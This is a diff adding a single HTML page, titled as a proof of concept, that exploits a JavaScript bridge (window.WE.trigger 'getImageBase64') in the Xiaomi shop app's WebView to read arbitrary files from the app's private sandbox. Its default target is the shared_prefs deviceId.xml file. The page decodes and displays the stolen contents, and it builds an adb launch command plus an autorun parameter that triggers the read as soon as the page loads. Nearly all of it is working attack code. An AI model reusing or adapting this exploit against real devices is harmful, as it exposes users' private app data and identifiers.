@@ -1,0 +1,347 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<link rel="icon" href="data:,">
+<title>xmshop sandbox file reader PoC</title>
+<style>
+  :root { color-scheme: light dark; }
+  body {
+    margin: 0;
+    font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"PingFang SC","Microsoft YaHei",sans-serif;
+    background: #111827;
+    color: #e5e7eb;
+  }
+  .wrap {
+    max-width: 1080px;
+    margin: 0 auto;
+    padding: 16px;
+  }
+  .card {
+    background: #1f2937;
+    border: 1px solid #374151;
+    border-radius: 12px;
+    padding: 16px;
+    margin-bottom: 16px;
+  }
+  h1, h2 { margin: 0 0 12px; }
+  .muted { color: #9ca3af; }
+  .ok { color: #34d399; }
+  .bad { color: #f87171; }
+  label { display: block; margin: 10px 0 6px; font-weight: 600; }
+  input[type="text"], textarea {
+    width: 100%;
+    box-sizing: border-box;
+    border: 1px solid #4b5563;
+    background: #111827;
+    color: #f9fafb;
+    border-radius: 8px;
+    padding: 10px 12px;
+    font: inherit;
+  }
+  textarea {
+    min-height: 150px;
+    resize: vertical;
+    white-space: pre-wrap;
+    word-break: break-all;
+  }
+  button {
+    border: 0;
+    border-radius: 8px;
+    padding: 10px 14px;
+    margin: 8px 8px 0 0;
+    font: inherit;
+    cursor: pointer;
+    background: #2563eb;
+    color: white;
+  }
+  button.secondary { background: #4b5563; }
+  button.warn { background: #d97706; }
+  .grid {
+    display: grid;
+    grid-template-columns: 1fr;
+    gap: 16px;
+  }
+  @media (min-width: 900px) {
+    .grid { grid-template-columns: 1fr 1fr; }
+  }
+  pre {
+    margin: 0;
+    white-space: pre-wrap;
+    word-break: break-all;
+    background: #0b1220;
+    border: 1px solid #374151;
+    border-radius: 8px;
+    padding: 12px;
+    min-height: 120px;
+  }
+  img {
+    max-width: 100%;
+    border: 1px solid #374151;
+    border-radius: 8px;
+    background: white;
+  }
+  .small { font-size: 12px; }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="card">
+    <h1>xmshop sandbox file reader PoC</h1>
+    <div class="muted">Single-file page. Serve it over HTTPS. Keep the first page fully inline.</div>
+    <div id="bridgeStatus" class="small bad" style="margin-top:8px;">Bridge status: checking...</div>
+  </div>
+
+  <div class="card">
+    <label for="pathInput">Target file path</label>
+    <input id="pathInput" type="text" value="/data/user/0/com.xiaomi.shop/shared_prefs/deviceId.xml">
+
+    <div>
+      <button id="readBtn">Read file</button>
+      <button id="sampleBtn" class="secondary">Use sample path</button>
+      <button id="clearBtn" class="secondary">Clear result</button>
+    </div>
+
+    <label for="launchUrl">Launch URL</label>
+    <input id="launchUrl" type="text" readonly>
+
+    <label for="adbCmd">ADB command</label>
+    <textarea id="adbCmd" readonly></textarea>
+    <div class="small muted">Tip: with <code>autorun=1</code>, the page auto-reads the current path after load.</div>
+  </div>
+
+  <div class="grid">
+    <div class="card">
+      <h2>Parsed result</h2>
+      <label>Event name</label>
+      <pre id="eventName"></pre>
+      <label>Returned JSON</label>
+      <pre id="jsonResult"></pre>
+      <label>Base64</label>
+      <pre id="base64Result"></pre>
+    </div>
+
+    <div class="card">
+      <h2>Content view</h2>
+      <label>UTF-8 text preview</label>
+      <textarea id="textResult" readonly></textarea>
+      <label>Binary info / error</label>
+      <pre id="infoResult"></pre>
+      <label>Image preview (if detected as image)</label>
+      <div id="imageWrap" class="muted">No image preview yet</div>
+    </div>
+  </div>
+</div>
+
+<script>
+(function () {
+  const $ = (id) => document.getElementById(id);
+  const pathInput = $("pathInput");
+  const launchUrl = $("launchUrl");
+  const adbCmd = $("adbCmd");
+  const bridgeStatus = $("bridgeStatus");
+  const eventName = $("eventName");
+  const jsonResult = $("jsonResult");
+  const base64Result = $("base64Result");
+  const textResult = $("textResult");
+  const infoResult = $("infoResult");
+  const imageWrap = $("imageWrap");
+
+  let currentRequestId = 1;
+
+  function setBridgeStatus() {
+    const target = window.__nativeWE || window.WE;
+    const ok = !!(target && typeof target.trigger === "function");
+    bridgeStatus.className = "small " + (ok ? "ok" : "bad");
+    bridgeStatus.textContent = "Bridge status: " + (ok ? "window.WE.trigger detected" : "window.WE.trigger not detected");
+  }
+
+  function qp(name) {
+    return new URLSearchParams(location.search).get(name);
+  }
+
+  function escapeForDoubleQuotedAdb(str) {
+    return str.replace(/(["`$\\])/g, "\\$1");
+  }
+
+  function updateLaunchInfo() {
+    const base = location.origin + location.pathname;
+    const target = pathInput.value.trim();
+    const url = base + "?f=" + encodeURIComponent(target) + "&autorun=1";
+    launchUrl.value = url;
+    adbCmd.value =
+      'adb shell am start -n com.xiaomi.shop/com.xiaomi.miot.store.ui.MiotStoreMainActivity --es url "' +
+      escapeForDoubleQuotedAdb(url) +
+      '"';
+  }
+
+  function clearResult() {
+    eventName.textContent = "";
+    jsonResult.textContent = "";
+    base64Result.textContent = "";
+    textResult.value = "";
+    infoResult.textContent = "";
+    imageWrap.innerHTML = '<span class="muted">No image preview yet</span>';
+  }
+
+  function bytesToHex(bytes, maxLen) {
+    const end = Math.min(bytes.length, maxLen);
+    const out = [];
+    for (let i = 0; i < end; i++) {
+      out.push(bytes[i].toString(16).padStart(2, "0"));
+    }
+    return out.join(" ");
+  }
+
+  function decodeBase64ToBytes(b64) {
+    const bin = atob(b64);
+    const bytes = new Uint8Array(bin.length);
+    for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
+    return bytes;
+  }
+
+  function looksLikeImage(path, bytes) {
+    const p = (path || "").toLowerCase();
+    if (/\.(png|jpg|jpeg|gif|webp|bmp)$/.test(p)) return true;
+    if (bytes.length >= 8 &&
+        bytes[0] === 0x89 && bytes[1] === 0x50 && bytes[2] === 0x4e && bytes[3] === 0x47) return "image/png";
+    if (bytes.length >= 3 &&
+        bytes[0] === 0xff && bytes[1] === 0xd8 && bytes[2] === 0xff) return "image/jpeg";
+    if (bytes.length >= 6) {
+      const sig = String.fromCharCode.apply(null, bytes.slice(0, 6));
+      if (sig === "GIF87a" || sig === "GIF89a") return "image/gif";
+    }
+    if (bytes.length >= 12) {
+      const riff = String.fromCharCode.apply(null, bytes.slice(0, 4));
+      const webp = String.fromCharCode.apply(null, bytes.slice(8, 12));
+      if (riff === "RIFF" && webp === "WEBP") return "image/webp";
+    }
+    return false;
+  }
+
+  function renderDecoded(path, b64) {
+    const bytes = decodeBase64ToBytes(b64);
+    const text = new TextDecoder("utf-8", { fatal: false }).decode(bytes);
+    textResult.value = text;
+    infoResult.textContent =
+      "Byte length: " + bytes.length + "\n" +
+      "First 64 bytes (hex): " + bytesToHex(bytes, 64);
+
+    const imageType = looksLikeImage(path, bytes);
+    if (imageType) {
+      const mime = typeof imageType === "string" ? imageType : "image/*";
+      imageWrap.innerHTML = "";
+      const img = document.createElement("img");
+      img.alt = "decoded image preview";
+      img.src = "data:" + mime + ";base64," + b64;
+      imageWrap.appendChild(img);
+    } else {
+      imageWrap.innerHTML = '<span class="muted">Current content does not look like an image</span>';
+    }
+  }
+
+  function handleEmit(name, payload, id) {
+    eventName.textContent = String(name);
+    jsonResult.textContent = String(payload);
+    let parsed;
+    try {
+      parsed = JSON.parse(payload);
+    } catch (e) {
+      infoResult.textContent = "JSON parse failed: " + e;
+      return;
+    }
+
+    if (name !== "getImageBase64") {
+      infoResult.textContent = "Received a non-target event: " + name;
+      return;
+    }
+
+    if (parsed.code !== 0) {
+      base64Result.textContent = "";
+      textResult.value = "";
+      imageWrap.innerHTML = '<span class="muted">No image preview yet</span>';
+      infoResult.textContent = "Read failed, code=" + parsed.code + "\n" + String(parsed.data || "");
+      return;
+    }
+
+    const b64 = String(parsed.data || "");
+    base64Result.textContent = b64;
+    try {
+      renderDecoded(pathInput.value.trim(), b64);
+    } catch (e) {
+      infoResult.textContent = "Base64 decode/render failed: " + e;
+    }
+  }
+
+  function ensureEmitHook() {
+    const nativeWE = window.__nativeWE || window.WE;
+    if (nativeWE && typeof nativeWE.trigger === "function") {
+      window.__nativeWE = nativeWE;
+      window.WE = {
+        emit: handleEmit,
+        trigger: function () {
+          if (arguments.length === 2) return nativeWE.trigger(arguments[0], arguments[1]);
+          if (arguments.length === 3) return nativeWE.trigger(arguments[0], arguments[1], arguments[2]);
+          return nativeWE.trigger.apply(nativeWE, arguments);
+        },
+        triggerString: function () {
+          if (typeof nativeWE.triggerString !== "function") return null;
+          return nativeWE.triggerString.apply(nativeWE, arguments);
+        },
+        logHTML: function () {
+          if (typeof nativeWE.logHTML !== "function") return null;
+          return nativeWE.logHTML.apply(nativeWE, arguments);
+        }
+      };
+    } else {
+      window.WE = window.WE || {};
+      window.WE.emit = handleEmit;
+    }
+    setBridgeStatus();
+  }
+
+  function readFile() {
+    clearResult();
+    ensureEmitHook();
+    const path = pathInput.value.trim();
+    if (!path) {
+      infoResult.textContent = "Please input a target file path first";
+      return;
+    }
+    if (!(window.WE && typeof window.WE.trigger === "function")) {
+      infoResult.textContent = "WE.trigger not detected. Make sure this page is opened inside the target app plugin111 WebView.";
+      return;
+    }
+    const requestId = String(currentRequestId++);
+    infoResult.textContent = "Read request sent, requestId=" + requestId;
+    try {
+      window.WE.trigger("getImageBase64", path, requestId);
+    } catch (e) {
+      infoResult.textContent = "WE.trigger call failed: " + e;
+    }
+  }
+
+  $("readBtn").addEventListener("click", readFile);
+  $("sampleBtn").addEventListener("click", function () {
+    pathInput.value = "/data/user/0/com.xiaomi.shop/shared_prefs/deviceId.xml";
+    updateLaunchInfo();
+  });
+  $("clearBtn").addEventListener("click", clearResult);
+  pathInput.addEventListener("input", updateLaunchInfo);
+
+  const initialPath = qp("f");
+  if (initialPath) pathInput.value = initialPath;
+  ensureEmitHook();
+  updateLaunchInfo();
+  clearResult();
+
+  setInterval(setBridgeStatus, 1000);
+
+  if (qp("autorun") === "1") {
+    setTimeout(readFile, 600);
+  }
+})();
+</script>
+</body>
+</html>
